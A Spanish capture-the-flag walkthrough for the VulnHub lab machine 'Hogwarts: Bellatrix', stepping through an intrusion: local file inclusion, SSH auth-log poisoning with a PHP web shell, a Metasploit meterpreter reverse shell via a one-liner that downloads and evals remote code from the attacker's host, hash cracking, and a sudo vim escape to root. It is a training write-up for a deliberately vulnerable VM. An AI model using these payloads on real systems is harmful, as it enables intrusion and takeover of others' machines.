<h1 align="center">
<br>
  <img src="https://static.wikia.nocookie.net/esharrypotter/images/1/14/BellatrixLestrange.png/revision/latest?cb=20120917112905" alt="Front-End Checklist" width="200">
  <br>
  Hogwarts: Bellatrix
  <br>
</h1>

<h4 align="center">Maquina creada por <img src="https://img.icons8.com/android/344/twitter.png" alt="Front-End Checklist" width="12">@BertrandLorent9</h4>
<h4 align="center">Aquí puedes descargarte la <a href="https://www.vulnhub.com/entry/hogwarts-bellatrix,609/">página web</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Web](#web)
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Web](#web-1)
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Command Injection](#command-injection)
  - [SSH Log](#ssh-log)
- [Post-explotación](#post-explotación)
  - [Recopilación de información](#recopilación-de-información-1)
  - [Movimiento Lateral](#movimiento-lateral)
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [SUDO -L](#sudo--l)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [SUDO VIM](#sudo-vim)
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.221.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.221.6```

### Web

Esta es la página web que hemos encontrao, como vemos tiene un .php escondido:

<img src="https://i.gyazo.com/92dbe9567d0231df1554eeb910b3fe4d.png">


## Búsqueda de vulnerabilidades

### Web

Si usamos en mi caso **Ctrl+U** para ver el codigo fuente podemos encontrar una funcion **get** y un texto:

<img src="https://i.gyazo.com/1e1d112e282227f71c083812fea4911f.png">

## Explotación de vulnerabilidades

### Command Injection

Ahora explotaremos la vulnerabilidad de la funcion get añadiendole ```?file=```

<img src="https://i.gyazo.com/bf0399383f893584784b37dfe41fefc9.png">

> Imagen de command injection con /etc/passwd

### SSH Log

Gracias a esta [página web](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/) consegui tener privilegios de user.

Lo primero que haremos es leer el archivo ```/var/log/auth.log``` para ver si los logins fallan o aciertan en la conexión con el servidor web.

Procederemos ha poner un **codigo malicioso con php**(log poisoning) en la conexion ssh para poder ejecutar comandos del sistema como si fuese el cmd o la terminal:

```ssh '<?php system($_GET['c']); ?>'@192.168.221.6```

Lo siguiente es añadir a la url ```?file=/var/log/auth.log&c=``` para poder ejecutar comandos.

Ahora explotaremos la vulnerabilidad para ser user.

Lo primero iremos al metasploit y seguiremos estos comandos para crear u nscript y conseguir ser user.
```
use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   pubprn
   5   SyncAppvPublishingServer
   6   PSH (Binary)
   7   Linux
   8   Mac OS X
msf6 exploit(multi/script/web_delivery) > set target 1
msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost 192.168.221.4
msf exploit (web_delivery)>set srvport 8081
msf exploit (web_delivery)>exploit
```

```
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.221.4:8081/CPKPsYZc', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```

> Aquí el payload que me ha dado

La pondremo delante de ```192.168.221.6/ikilledsiriusblack.php?file=/var/log/auth.log&c=``` y nos creara un session en meterpreter.

Por ahora somos usuario **bellatrix**

## Post-explotación

Aquí tenemos la primera flag: **user: {69e0f71f25ece4351e4d73af430bec43}**

## Recopilación de información

Volveemos a recopilar toda la informacion possible que podamos encontrar.

En la carpeta ```/var/www/html/``` encontramos una carpeta muy peculiar iremos a ella para ver que contiene:

La carpeta se llama ```c2VjcmV0cw==``` que significa en base64 **secrets**

En esta carpeta procederemos ha hacer el comando ```ls -a``` para ver toanto como los archivos ocultos como los que estan a la vista.

Podemos ver que hay un archivo llamado ```Swordofgryffindor``` y otro ```.secret.dic```.

Dentro del archivo ```Swordofgryffindor``` encontramos esto:
```
lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0
```
Y en el ```.secret.dic``` podemos ver que es un diccionario.

## Movimiento Lateral

Lo que procedemos ha hacer es crackear ese hash encontrado anteriormente y pasarle el diccionario tambien encontrado antes.

Utilizaremos el [John the Ripper](https://www.openwall.com/john/) para crackearlo:
```john --wordlist=hp.dic hash```

> **hp.dic** es el diccionario y **hash** es el hash

Actualmente somos usuario **lestrange**

## Búsqueda de vulnerabilidades

### SUDO -L

Para ver que puede ejecutar este usuario como root usaremos el comando ```sudo -l```

El resultado es este:
```
(ALL : ALL) NOPASSWD: /usr/bin/vim
```

## Explotación de vulnerabilidades

### SUDO VIM

Al ver esto iremos a esta [página web](https://gtfobins.github.io/gtfobins/vim/#sudo) para ver como podemos explotar esta vulnerabilidad y ser **root**

Encontramos un payload que nos ayudara a escalar privilegios:

```sudo /usr/bin/vim -c ':!/bin/sh'```

Gracias a esto conseguirmos ser **root**

Y aquí tenemos la segunda flag:
```
 ____       _ _       _        _
 |  _ \     | | |     | |      (_)
 | |_) | ___| | | __ _| |_ _ __ ___  __
 |  _ < / _ \ | |/ _` | __| '__| \ \/ /
 | |_) |  __/ | | (_| | |_| |  | |>  <
 |____/ \___|_|_|\__,_|\__|_|  |_/_/\_\




  _               _
 | |             | |
 | |     ___  ___| |_ _ __ __ _ _ __   __ _  ___
 | |    / _ \/ __| __| '__/ _` | '_ \ / _` |/ _ \
 | |___|  __/\__ \ |_| | | (_| | | | | (_| |  __/
 |______\___||___/\__|_|  \__,_|_| |_|\__, |\___|
                                       __/ |
                                      |___/



root{ead5a85a11ba466011fced308d460a76}
```
## Información Adicional

Páginas web utilizadas:

- [RCE SSH LOG](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/) - Ejecucion de codigo remoto con Local File Inclusion y envenenamiento del SSH Log.

- [John the Ripper](https://www.openwall.com/john/) - Crackear contraseñas con un diccionario.

- [VIM](https://gtfobins.github.io/gtfobins/vim/#sudo) - Enumeración de escalada de privilegios.


**[⬆ back to top](#-----hogwarts-bellatrix-)**
